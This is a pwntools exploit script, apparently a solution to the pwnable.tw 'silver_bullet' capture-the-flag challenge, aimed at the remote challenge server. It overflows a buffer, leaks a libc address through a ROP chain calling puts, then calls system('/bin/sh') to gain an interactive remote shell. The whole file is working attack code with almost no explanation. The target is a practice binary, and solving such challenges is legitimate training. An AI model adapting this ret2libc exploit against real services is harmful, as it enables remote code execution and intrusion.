#!/bin/python3

from pwn import *

p = remote('chall.pwnable.tw', 10103)
#p = process('silver_bullet')

elf = ELF('./silver_bullet')
elf_rop = ROP(elf)

libc = ELF('./libc_32.so.6')
libc_rop = ROP(libc)

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

pop_ebx_ret = elf_rop.find_gadget(["pop ebx", "ret"])[0]
chain = p32(elf.plt['puts']) + p32(pop_ebx_ret) + p32(elf.got['puts']) + p32(elf.symbols['main'])

p.sendlineafter(b'Your choice :', b'1')
p.sendlineafter(b'bullet :', b'A' * 47)

p.sendlineafter(b'Your choice :', b'2')
p.sendlineafter(b'bullet :', b'A')

p.sendlineafter(b'Your choice :', b'2')
p.sendlineafter(b'bullet :', (b'A' * 7) + chain)

p.sendlineafter(b'Your choice :', b'3')
p.sendlineafter(b'Your choice :', b'3')


# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

p.recvuntil(b'You win !!\n')
puts_libc_addr = u32(p.recv(4))
print("Puts is at " + hex(puts_libc_addr))

base_libc_addr = puts_libc_addr - libc.sym['puts']
print("Libc base is " + hex(base_libc_addr))

binsh_libc_addr = base_libc_addr + 0x158E8B
print("Binsh string is at " + hex(binsh_libc_addr))

system_libc_addr = base_libc_addr + libc.symbols['system']
print("System is at " + hex(system_libc_addr))


# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

chain = p32(system_libc_addr) + p32(pop_ebx_ret) + p32(binsh_libc_addr)

p.sendlineafter(b'Your choice :', b'1')
p.sendlineafter(b'bullet :', b'A' * 47)

p.sendlineafter(b'Your choice :', b'2')
p.sendlineafter(b'bullet :', b'A')

p.sendlineafter(b'Your choice :', b'2')
p.sendlineafter(b'bullet :', (b'A' * 7) + chain)

p.sendlineafter(b'Your choice :', b'3')
p.sendlineafter(b'Your choice :', b'3')


# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

# Should have a shell at this point, yuh yuh yuh
p.interactive()

